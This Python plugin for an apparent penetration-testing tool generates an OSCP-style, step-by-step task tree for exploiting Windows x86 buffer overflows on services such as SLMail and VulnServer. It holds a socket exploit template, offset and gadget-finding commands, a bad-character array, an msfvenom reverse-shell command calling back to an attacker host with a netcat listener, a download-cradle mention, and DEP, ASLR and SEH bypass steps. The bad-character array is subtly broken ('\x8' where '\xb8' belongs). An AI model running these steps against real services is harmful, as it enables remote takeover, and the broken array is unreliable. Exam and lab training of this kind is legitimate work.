"""
Windows Buffer Overflow exploitation plugin

Generates tasks for Windows x86 buffer overflow exploitation including:
- EIP offset discovery using pattern generation
- Bad character identification
- SEH (Structured Exception Handler) exploitation
- JMP ESP / POP POP RET gadget finding
- Shellcode generation with encoders
- Protection bypass techniques (DEP/NX, ASLR, SafeSEH)
- Common exploitation issues (FDs, remote shells, socket interaction)

Extracted from HackTricks: windows-exploiting-basic-guide-oscp-lvl.md
OSCP-focused: Step-by-step Windows binary exploitation methodology
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class WindowsBufferOverflowPlugin(ServicePlugin):
    """Windows x86 buffer overflow exploitation plugin (OSCP-level)"""

    @property
    def name(self) -> str:
        return "windows-bof"

    @property
    def default_ports(self) -> List[int]:
        # Common vulnerable Windows services (SLMail, VulnServer, etc.)
        return [110, 9999, 9998, 8080, 10000]

    @property
    def service_names(self) -> List[str]:
        return ['pop3', 'slmail', 'vulnserver', 'brainstorm', 'gatekeeper', 'windows-service']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect Windows services suitable for BOF exploitation"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')
        product = port_info.get('product', '').lower()
        ostype = port_info.get('ostype', '').lower()

        # Detect by service name
        if any(svc in service for svc in self.service_names):
            return True

        # Detect by common vulnerable ports
        if port in self.default_ports:
            return True

        # Detect Windows systems on common ports
        if 'windows' in ostype or 'windows' in product:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Windows BOF exploitation task tree"""
        version = service_info.get('version', '')
        service = service_info.get('service', 'windows-service')

        tasks = {
            'id': f'windows-bof-{port}',
            'name': f'Windows Buffer Overflow Exploitation (Port {port})',
            'type': 'parent',
            'children': []
        }

        # PHASE 1: Setup & Environment
        tasks['children'].append({
            'id': f'bof-setup-{port}',
            'name': 'Phase 1: Exploitation Environment Setup',
            'type': 'parent',
            'children': [
                {
                    'id': f'immunity-debugger-{port}',
                    'name': 'Setup Immunity Debugger',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Configure debugger for BOF analysis (Windows machine)',
                        'tags': ['OSCP:HIGH', 'SETUP', 'WINDOWS'],
                        'next_steps': [
                            'Install Immunity Debugger on Windows target/VM',
                            'Install mona.py: !mona (Download from corelan.be)',
                            'Set working folder: !mona config -set workingfolder c:\\mona\\%p',
                            'Change font: Options > Appearance > Fonts > Consolas Bold 9',
                            'Attach target process: File > Attach'
                        ],
                        'alternatives': [
                            'x32dbg (x64dbg) with ERC.Xdbg plugin',
                            'WinDbg with mona.py integration',
                            'OllyDbg (legacy, not recommended)'
                        ],
                        'notes': 'Immunity + mona.py = OSCP standard. Practice attaching process and using mona commands.'
                    }
                },
                {
                    'id': f'python-exploit-template-{port}',
                    'name': 'Create basic Python exploit template',
                    'type': 'command',
                    'metadata': {
                        'command': f'''cat > exploit.py << 'EOF'
#!/usr/bin/env python3
import socket

target_ip = "{target}"
target_port = {port}

# Fuzzing to find crash point
buffer = "A" * 2700

try:
    print(f"[*] Connecting to {{target_ip}}:{{target_port}}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((target_ip, target_port))

    # Receive banner if any
    banner = s.recv(1024)
    print(f"[+] Banner: {{banner}}")

    # Send exploit buffer (adjust command per service)
    print(f"[*] Sending buffer of {{len(buffer)}} bytes")
    s.send(buffer.encode() if isinstance(buffer, str) else buffer)

    # Receive response
    response = s.recv(1024)
    print(f"[+] Response: {{response}}")
    s.close()
    print("[+] Finished!")
except Exception as e:
    print(f"[-] Error: {{e}}")
EOF
chmod +x exploit.py''',
                        'description': 'Create Python exploit template for iterative testing',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            'socket.SOCK_STREAM': 'TCP connection',
                            's.settimeout(5)': 'Prevent hanging on unresponsive service',
                            'buffer = "A" * 2700': 'Initial fuzzing buffer (adjust size)'
                        },
                        'success_indicators': [
                            'Service crashes (check debugger)',
                            'EIP overwritten with 41414141 (AAAA)'
                        ],
                        'failure_indicators': [
                            'No crash (increase buffer size)',
                            'Service disconnects cleanly'
                        ],
                        'next_steps': [
                            'Run exploit: python3 exploit.py',
                            'Check EIP in Immunity Debugger',
                            'If crashed, proceed to offset discovery'
                        ],
                        'alternatives': [
                            'Use Metasploit exploit skeleton',
                            'Bash with netcat: printf "A%.0s" {{1..2700}} | nc target port'
                        ],
                        'notes': 'Always test on local Windows VM first. Adjust service-specific commands (USER/PASS for POP3, TRUN for VulnServer, etc.).'
                    }
                }
            ]
        })

        # PHASE 2: Offset Discovery
        tasks['children'].append({
            'id': f'bof-offset-discovery-{port}',
            'name': 'Phase 2: EIP Offset Discovery',
            'type': 'parent',
            'children': [
                {
                    'id': f'pattern-create-{port}',
                    'name': 'Generate cyclic pattern',
                    'type': 'command',
                    'metadata': {
                        'command': '/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000',
                        'description': 'Create unique pattern to identify EIP offset',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-l 3000': 'Pattern length (match or exceed crash buffer size)'
                        },
                        'success_indicators': [
                            'Pattern generated (copy to exploit buffer)',
                            'Service crashes with unique EIP value'
                        ],
                        'failure_indicators': [
                            'Pattern too short (service doesn\'t crash)',
                            'EIP still shows 41414141 (pattern not used)'
                        ],
                        'next_steps': [
                            'Replace buffer in exploit.py with pattern',
                            'Run exploit and crash service',
                            'Note EIP value from Immunity Debugger',
                            'Calculate offset with pattern_offset.rb'
                        ],
                        'alternatives': [
                            'pwntools: cyclic(3000)',
                            'mona.py: !mona pattern_create 3000',
                            'gdb-peda: pattern create 3000'
                        ],
                        'notes': 'Pattern must be BIGGER than crash buffer. Use same length for create/offset commands.'
                    }
                },
                {
                    'id': f'pattern-offset-{port}',
                    'name': 'Calculate EIP offset',
                    'type': 'command',
                    'metadata': {
                        'command': '/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q <EIP_VALUE>',
                        'description': 'Find exact offset to EIP overwrite',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-l 3000': 'Pattern length (must match pattern_create)',
                            '-q <EIP_VALUE>': 'EIP value from crash (little-endian, e.g., 39694438)'
                        },
                        'success_indicators': [
                            'Exact match at offset XXXX',
                            'Offset number returned (e.g., 2606)'
                        ],
                        'failure_indicators': [
                            'Pattern not found (wrong EIP value or length mismatch)',
                            'No exact match (pattern corrupted)'
                        ],
                        'next_steps': [
                            'Verify offset: buffer = "A"*OFFSET + "BBBB" + "C"*100',
                            'Crash service - EIP should be 42424242 (BBBB)',
                            'If verified, proceed to shellcode space check'
                        ],
                        'alternatives': [
                            'mona.py: !mona pattern_offset <EIP_VALUE>',
                            'Manual: Search pattern for EIP bytes',
                            'pwntools: cyclic_find(p32(0x39694438))'
                        ],
                        'notes': 'CRITICAL: EIP value is little-endian. If debugger shows 39694438, use that exact value (not reversed).'
                    }
                },
                {
                    'id': f'verify-eip-control-{port}',
                    'name': 'Verify EIP control',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Confirm precise EIP overwrite capability',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'next_steps': [
                            'Modify exploit: buffer = "A" * <OFFSET> + "BBBB" + "C" * 600',
                            'Run exploit and crash service',
                            'Verify EIP = 42424242 in Immunity Debugger',
                            'Check ESP points to "C" characters (shellcode space)',
                            'Note ESP address and calculate available space'
                        ],
                        'alternatives': [
                            'Use different markers: "DEADBEEF" instead of BBBB',
                            'mona.py: !mona compare -f pattern.txt -a <ESP_ADDRESS>'
                        ],
                        'notes': 'ESP should point to 600 bytes of "C" characters. Minimum 400 bytes needed for shellcode. 600+ = excellent.'
                    }
                }
            ]
        })

        # PHASE 3: Bad Character Identification
        tasks['children'].append({
            'id': f'bof-badchars-{port}',
            'name': 'Phase 3: Bad Character Discovery',
            'type': 'parent',
            'children': [
                {
                    'id': f'generate-badchars-{port}',
                    'name': 'Generate bad character test string',
                    'type': 'command',
                    'metadata': {
                        'command': '''python3 << 'EOF'
badchars = (
"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10"
"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20"
"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30"
"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40"
"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50"
"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60"
"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70"
"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80"
"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90"
"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0"
"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0"
"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\x8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0"
"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0"
"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0"
"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0"
"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff"
)
print(badchars)
EOF''',
                        'description': 'Generate all possible bytes (0x01-0xFF) for bad char testing',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'success_indicators': ['All 255 bytes printed (excluding \\x00)'],
                        'failure_indicators': ['Missing bytes in output'],
                        'next_steps': [
                            'Copy badchars to exploit: buffer = "A"*OFFSET + "BBBB" + badchars',
                            'Crash service and examine stack in Immunity',
                            'Right-click ESP > Follow in Dump',
                            'Compare hex dump to badchars sequence',
                            'Identify corrupted/missing bytes'
                        ],
                        'alternatives': [
                            'mona.py: !mona bytearray -cpb "\\x00" (generate + compare)',
                            'Use mona compare: !mona compare -f bytearray.bin -a <ESP_ADDRESS>',
                            'Online generator: https://github.com/cytopia/badchars'
                        ],
                        'notes': 'ALWAYS exclude \\x00 (null byte) by default. Common bad chars: \\x00 \\x0a \\x0d (null, newline, carriage return). HTTP/text protocols often have more.'
                    }
                },
                {
                    'id': f'identify-badchars-{port}',
                    'name': 'Identify and document bad characters',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Compare stack memory to badchars to find corrupted bytes',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'next_steps': [
                            'In Immunity: Right-click ESP > Follow in Dump',
                            'Compare hex bytes to badchars sequence',
                            'Look for: Missing bytes, truncation, wrong values',
                            'Document ALL bad chars (e.g., \\x00\\x0a\\x0d\\x20)',
                            'Re-test after removing each bad char until clean'
                        ],
                        'success_indicators': [
                            'All badchars visible in memory (except known bad)',
                            'Sequential bytes 01 02 03... without gaps'
                        ],
                        'failure_indicators': [
                            'Bytes truncated after specific char',
                            'Random byte corruption',
                            'Service terminates before full buffer sent'
                        ],
                        'alternatives': [
                            'mona.py automation: !mona compare -f bytearray.bin -a <ESP>',
                            'Manual hex comparison',
                            'Script to parse memory dump'
                        ],
                        'notes': 'ITERATIVE PROCESS: Remove bad char, regenerate bytearray, re-test. Example: If \\x0a bad, regenerate without: !mona bytearray -cpb "\\x00\\x0a"'
                    }
                }
            ]
        })

        # PHASE 4: Return Address (JMP ESP or SEH)
        tasks['children'].append({
            'id': f'bof-return-address-{port}',
            'name': 'Phase 4: Find Return Address (JMP ESP/POP POP RET)',
            'type': 'parent',
            'children': [
                {
                    'id': f'mona-modules-{port}',
                    'name': 'Identify modules without protections',
                    'type': 'command',
                    'metadata': {
                        'command': '!mona modules  # (Run in Immunity Debugger)',
                        'description': 'Find DLLs/modules without ASLR, DEP, SafeSEH for stable gadgets',
                        'tags': ['OSCP:HIGH', 'WINDOWS'],
                        'flag_explanations': {
                            '!mona modules': 'List all loaded modules with protection status'
                        },
                        'success_indicators': [
                            'Module with all protections = False (ideal)',
                            'OS DLL with False protections (fallback)'
                        ],
                        'failure_indicators': [
                            'All modules have ASLR = True',
                            'All modules have SafeSEH = True'
                        ],
                        'next_steps': [
                            'Target criteria: Rebase=False, SafeSEH=False, ASLR=False, NXCompat=False',
                            'Prefer application DLLs over OS DLLs',
                            'Note module name for gadget search',
                            'If all protected: Find info leak or use partial overwrite'
                        ],
                        'alternatives': [
                            'x64dbg ERC.Xdbg: ERC --ModuleInfo',
                            'WinDbg: lm (list modules) + manual checking',
                            'Manual: Check PE headers with CFF Explorer'
                        ],
                        'notes': 'OS DLLs (kernel32, ntdll) have ASLR on modern Windows. Application DLLs often don\'t. SafeSEH only matters for SEH exploitation.'
                    }
                },
                {
                    'id': f'find-jmp-esp-{port}',
                    'name': 'Find JMP ESP gadget (Standard BOF)',
                    'type': 'command',
                    'metadata': {
                        'command': '!mona find -s "\\xff\\xe4" -m <MODULE_NAME>  # JMP ESP opcode',
                        'description': 'Locate JMP ESP instruction in unprotected module',
                        'tags': ['OSCP:HIGH', 'WINDOWS'],
                        'flag_explanations': {
                            '-s "\\xff\\xe4"': 'JMP ESP opcode bytes (x86)',
                            '-m <MODULE_NAME>': 'Search within specific module (e.g., slmfc.dll)',
                            'Alternative opcodes': 'JMP ESI = \\xff\\xe6, CALL ESP = \\xff\\xd4, PUSH ESP; RET = \\x54\\xc3'
                        },
                        'success_indicators': [
                            'Gadget address found (e.g., 0x5f4a358f)',
                            'Address contains NO bad characters',
                            'Address is in unprotected module'
                        ],
                        'failure_indicators': [
                            'No results (try different module or opcode)',
                            'All addresses contain bad characters',
                            'Only ASLR-protected modules available'
                        ],
                        'next_steps': [
                            'Verify gadget: Check address in Immunity (Ctrl+G)',
                            'Ensure no bad chars when written little-endian',
                            'Test: buffer = "A"*OFFSET + p32(ADDRESS) + "C"*600',
                            'EIP should redirect to ESP (your C\'s)'
                        ],
                        'alternatives': [
                            'mona.py: !mona jmp -r esp -m <MODULE>',
                            'Manual: Search with Immunity search function',
                            'ROPgadget: ROPgadget.py --binary module.dll | grep "jmp esp"'
                        ],
                        'notes': 'Common alternative: CALL ESP (\\xff\\xd4), PUSH ESP; RET (\\x54\\xc3). Convert little-endian: 0x5f4a358f → \\x8f\\x35\\x4a\\x5f'
                    }
                },
                {
                    'id': f'find-pop-pop-ret-{port}',
                    'name': 'Find POP POP RET gadget (SEH Exploitation)',
                    'type': 'command',
                    'metadata': {
                        'command': '!mona seh -m <MODULE_NAME>  # Find SEH gadgets',
                        'description': 'Locate POP POP RET sequence for SEH-based exploitation',
                        'tags': ['OSCP:HIGH', 'WINDOWS', 'SEH'],
                        'flag_explanations': {
                            '!mona seh': 'Find POP reg; POP reg; RET gadgets',
                            '-m <MODULE>': 'Target specific unprotected module',
                            'SafeSEH': 'Must be False for SEH exploitation'
                        },
                        'success_indicators': [
                            'POP POP RET address found',
                            'Module has SafeSEH = False',
                            'Address has no bad characters'
                        ],
                        'failure_indicators': [
                            'All modules have SafeSEH = True',
                            'No suitable gadgets found',
                            'All addresses contain bad chars'
                        ],
                        'next_steps': [
                            'SEH exploitation: Overwrite nSEH and SEH records',
                            'nSEH: Short jump (\\xeb\\x06 + padding)',
                            'SEH: POP POP RET address (little-endian)',
                            'Place shellcode after SEH overwrite'
                        ],
                        'alternatives': [
                            'x64dbg ERC: ERC --SEH',
                            'Manual: Search for 5B 5B C3 (POP POP RET opcodes)',
                            'mona.py: !mona find -s "\\x5b\\x5b\\xc3"'
                        ],
                        'notes': 'SEH exploitation: nSEH=next SEH (4 bytes), SEH=handler (4 bytes). Trigger exception after overwriting SEH chain. x86 only - x64 uses different SEH.'
                    }
                }
            ]
        })

        # PHASE 5: Shellcode Generation
        tasks['children'].append({
            'id': f'bof-shellcode-{port}',
            'name': 'Phase 5: Shellcode Generation',
            'type': 'parent',
            'children': [
                {
                    'id': f'msfvenom-reverse-shell-{port}',
                    'name': 'Generate reverse shell shellcode',
                    'type': 'command',
                    'metadata': {
                        'command': f'msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=443 -f python -v shellcode -b "\\x00\\x0a\\x0d"',
                        'description': 'Generate encoded shellcode avoiding bad characters',
                        'tags': ['OSCP:HIGH', 'WINDOWS'],
                        'flag_explanations': {
                            '-p windows/shell_reverse_tcp': 'Windows reverse TCP shell',
                            'LHOST': 'Attacker IP (use tun0 for OSCP VPN)',
                            'LPORT': 'Attacker listening port (443 bypasses egress filtering)',
                            '-f python': 'Output format (python variable)',
                            '-v shellcode': 'Variable name',
                            '-b "\\x00\\x0a\\x0d"': 'Bad characters to avoid (adjust per findings)',
                            'EXITFUNC=thread': 'Clean exit (prevents crash) - add to command',
                            '-e x86/shikata_ga_nai': 'Encoder (polymorphic) - add if needed'
                        },
                        'success_indicators': [
                            'Shellcode generated successfully',
                            'No bad characters in output',
                            'Size < 400 bytes (fits in exploit space)'
                        ],
                        'failure_indicators': [
                            'Shellcode contains bad chars',
                            'Shellcode too large (>600 bytes)',
                            'Encoding failed'
                        ],
                        'next_steps': [
                            'Start nc listener: nc -nlvp 443',
                            'Add shellcode to exploit after NOP sled',
                            'Full buffer: "A"*OFFSET + JMP_ESP + NOPs + shellcode',
                            'Test exploit and catch shell'
                        ],
                        'alternatives': [
                            'Exec payload: msfvenom -p windows/exec CMD=<command>',
                            'Meterpreter: -p windows/meterpreter/reverse_tcp',
                            'Manual shellcode: Custom assembly with nasm',
                            'Download-exec: powershell IEX cradle'
                        ],
                        'notes': 'CRITICAL: Always use EXITFUNC=thread and shikata_ga_nai encoder for stability. Port 443 recommended (allowed outbound). Add 8-16 NOPs before shellcode.'
                    }
                },
                {
                    'id': f'final-exploit-{port}',
                    'name': 'Construct final exploit',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Assemble all components into working exploit',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'next_steps': [
                            'Structure: FILLER + EIP + NOPs + SHELLCODE + PADDING',
                            'filler = "A" * OFFSET',
                            'eip = p32(JMP_ESP_ADDRESS)  # little-endian',
                            'nops = "\\x90" * 16  # NOP sled',
                            'shellcode = <msfvenom output>',
                            'padding = "C" * (TOTAL_LENGTH - len(filler+eip+nops+shellcode))',
                            'buffer = filler + eip + nops + shellcode + padding'
                        ],
                        'success_indicators': [
                            'Exploit triggers crash and redirects to shellcode',
                            'Netcat receives reverse shell',
                            'Shell is stable and responsive'
                        ],
                        'failure_indicators': [
                            'Crash but no shell (bad shellcode/bad chars)',
                            'Shell connects but dies immediately (use EXITFUNC=thread)',
                            'Access violation (wrong offset/address)'
                        ],
                        'alternatives': [
                            'SEH exploit: FILLER + nSEH + SEH + NOP + SHELLCODE',
                            'Egg hunter: Small stub searches memory for shellcode marker',
                            'Socket reuse: dup2() for remote interaction'
                        ],
                        'notes': 'OSCP tip: Document EVERY step in screenshots. Show EIP control, bad chars, gadget selection, shellcode generation, final exploit. Reproducibility = points.'
                    }
                }
            ]
        })

        # PHASE 6: Protection Bypasses
        tasks['children'].append({
            'id': f'bof-protection-bypass-{port}',
            'name': 'Phase 6: Bypassing Modern Protections',
            'type': 'parent',
            'children': [
                {
                    'id': f'bypass-dep-nx-{port}',
                    'name': 'DEP/NX Bypass (ROP/ret2libc)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass Data Execution Prevention using ROP chains',
                        'tags': ['OSCP:MEDIUM', 'ADVANCED', 'WINDOWS'],
                        'next_steps': [
                            'ROP Technique: Chain executable code fragments (gadgets)',
                            'ret2libc: Call VirtualProtect() to mark stack executable',
                            'mona.py: !mona rop -m <module> (generate ROP chains)',
                            'Build ROP chain: Set registers, call VirtualProtect',
                            'After VirtualProtect: Stack is RWX, jump to shellcode'
                        ],
                        'alternatives': [
                            'ret2libc: Call system() or WinExec()',
                            'ret2syscall: Direct system call invocation',
                            'VirtualAlloc: Allocate RWX memory region',
                            'WriteProcessMemory: Write to executable region'
                        ],
                        'notes': 'Advanced OSCP: DEP bypass via ROP. mona rop -m <dll> generates gadgets. VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, &old) is key.'
                    }
                },
                {
                    'id': f'bypass-aslr-{port}',
                    'name': 'ASLR Bypass Techniques',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Defeat Address Space Layout Randomization',
                        'tags': ['OSCP:MEDIUM', 'ADVANCED', 'WINDOWS'],
                        'next_steps': [
                            'Technique 1: Target non-ASLR modules (preferred OSCP)',
                            'Technique 2: Information leak (leak stack/heap/libc address)',
                            'Technique 3: Partial overwrite (modify least significant bytes)',
                            'Technique 4: Brute-force (32-bit only, low entropy)',
                            'Technique 5: ret2plt (leak GOT entry, calculate offsets)'
                        ],
                        'alternatives': [
                            'Format string leak: %p %p %p... to dump stack',
                            'Use-after-free: Leak heap pointers',
                            'Read /proc/[pid]/maps on Linux',
                            'Windows: PEB/TEB leak via null pointer dereference'
                        ],
                        'notes': 'OSCP: ASLR often disabled on lab machines. If enabled, find non-ASLR module or info leak. 32-bit ASLR = 8-16 bits entropy (brute-forceable).'
                    }
                },
                {
                    'id': f'bypass-canaries-{port}',
                    'name': 'Stack Canary Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Circumvent stack canaries (Stack Protector)',
                        'tags': ['OSCP:LOW', 'ADVANCED'],
                        'next_steps': [
                            'Bypass 1: Leak canary (format string, arbitrary read)',
                            'Bypass 2: Brute-force canary (forked processes)',
                            'Bypass 3: Overwrite stack pointers before canary',
                            'Bypass 4: Modify both master and thread canary',
                            'Bypass 5: Overwrite __stack_chk_fail GOT entry'
                        ],
                        'alternatives': [
                            'Leak canary: Use printf format string %p at correct offset',
                            'Forked services: Brute-force canary byte-by-byte',
                            'Partial overwrite: Only overwrite return address LSB',
                            'Pointer redirect: Overwrite function pointer before canary'
                        ],
                        'notes': 'Canary = 0x00 + 3 random bytes (x86) or 0x00 + 7 random (x64). Null byte prevents string functions from leaking. Uncommon in basic OSCP boxes.'
                    }
                },
                {
                    'id': f'seh-exploitation-{port}',
                    'name': 'SEH (Structured Exception Handler) Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Windows-specific SEH chain overwrite exploitation',
                        'tags': ['OSCP:HIGH', 'WINDOWS', 'SEH'],
                        'next_steps': [
                            'SEH Structure: nSEH (4B) + SEH (4B) on stack',
                            'Overwrite SEH with POP POP RET address',
                            'Overwrite nSEH with short jump (\\xeb\\x06 + \\x90\\x90)',
                            'Trigger exception (access violation)',
                            'SEH chain: OS calls POP POP RET → jumps to nSEH → executes short jump → reaches shellcode',
                            'mona.py: !mona seh for gadgets'
                        ],
                        'alternatives': [
                            'Long jump: Use 5-byte near jump before nSEH',
                            'Short jump chain: Multiple small jumps',
                            'SafeSEH bypass: Use non-SafeSEH module',
                            'SEHOP bypass: Advanced (rare in OSCP)'
                        ],
                        'notes': 'SEH = Windows x86 only. nSEH offset found via pattern. Common nSEH: \\xeb\\x06\\x90\\x90 (jump 6 bytes forward). SEH = POP POP RET gadget (no bad chars).'
                    }
                }
            ]
        })

        # PHASE 7: Troubleshooting
        tasks['children'].append({
            'id': f'bof-troubleshooting-{port}',
            'name': 'Phase 7: Common Exploitation Problems',
            'type': 'parent',
            'children': [
                {
                    'id': f'shell-interaction-{port}',
                    'name': 'Shell interaction over sockets',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Fix stdin/stdout for remote shell interaction',
                        'tags': ['OSCP:MEDIUM', 'TROUBLESHOOTING'],
                        'next_steps': [
                            'Problem: system("/bin/sh") works locally but not remotely',
                            'Cause: stdin/stdout not redirected to network socket',
                            'Solution: Use dup2() to redirect FDs before exec',
                            'FD 0 = stdin, FD 1 = stdout, FD 2 = stderr',
                            'FD 4 = network socket (typically)',
                            'ROP chain: dup2(4, 0), dup2(4, 1), execve("/bin/sh")'
                        ],
                        'alternatives': [
                            'Use reverse shell shellcode (handles FDs automatically)',
                            'Bind shell: Spawns shell on target port',
                            'msfvenom --platform linux/x86 -p linux/x86/shell_reverse_tcp'
                        ],
                        'notes': 'Remote exploitation: Always use reverse shell shellcode OR manually dup2() stdin/stdout. Local exploit = system("sh"). Remote = need socket redirection.'
                    }
                },
                {
                    'id': f'shellcode-corruption-{port}',
                    'name': 'Shellcode self-corruption',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Prevent shellcode from overwriting itself',
                        'tags': ['OSCP:MEDIUM', 'TROUBLESHOOTING'],
                        'next_steps': [
                            'Problem: Shellcode crashes immediately',
                            'Cause: Some shellcodes write to memory (overwrite themselves)',
                            'Solution: Add 16-32 byte NOP sled before shellcode',
                            'nops = "\\x90" * 32',
                            'Alternative: JMP forward 50 bytes, place shellcode after'
                        ],
                        'alternatives': [
                            'Use encoded shellcode (shikata_ga_nai)',
                            'Stage shellcode: Small stub downloads full payload',
                            'Egg hunter: Search memory for shellcode marker'
                        ],
                        'notes': 'ALWAYS add NOP sled before shellcode. Minimum 8 bytes, 16-32 recommended. Some encoders expand during decoding and need space.'
                    }
                },
                {
                    'id': f'service-restart-{port}',
                    'name': 'Service restart and stability',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Handle service crashes during exploitation',
                        'tags': ['OSCP:HIGH', 'TROUBLESHOOTING'],
                        'next_steps': [
                            'Windows service restart: net start <service>',
                            'Manual restart: Services.msc (GUI)',
                            'Immunity: Restart debugging session (Ctrl+F2)',
                            'EXITFUNC=thread: Clean exit (prevents full crash)',
                            'Use staged payloads for multiple exploitation attempts'
                        ],
                        'alternatives': [
                            'sc stop <service> && sc start <service>',
                            'taskkill /F /IM process.exe && start process.exe',
                            'Watchdog script: Auto-restart on crash'
                        ],
                        'notes': 'OSCP exam: Minimize service restarts (time-consuming). Use EXITFUNC=thread for clean exploitation. Test locally first.'
                    }
                }
            ]
        })

        # PHASE 8: Exploit Research
        if version:
            tasks['children'].append({
                'id': f'bof-exploit-research-{port}',
                'name': f'Phase 8: Exploit Research ({version})',
                'type': 'parent',
                'children': [
                    {
                        'id': f'searchsploit-version-{port}',
                        'name': f'SearchSploit: {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit {version}',
                            'description': 'Search ExploitDB for known exploits',
                            'tags': ['OSCP:HIGH', 'RESEARCH'],
                            'success_indicators': ['Exploits found', 'BOF exploit available'],
                            'next_steps': [
                                'Review exploit code: searchsploit -x <ID>',
                                'Copy exploit: searchsploit -m <ID>',
                                'Adapt to target environment',
                                'Note bad characters and offsets'
                            ],
                            'alternatives': [
                                f'Google: "{version} buffer overflow exploit"',
                                'Metasploit: search {version}',
                                'Exploit-DB website: https://exploit-db.com'
                            ],
                            'notes': 'Study existing exploits to learn offset discovery process. Adapt rather than copy directly.'
                        }
                    }
                ]
            })

        return tasks
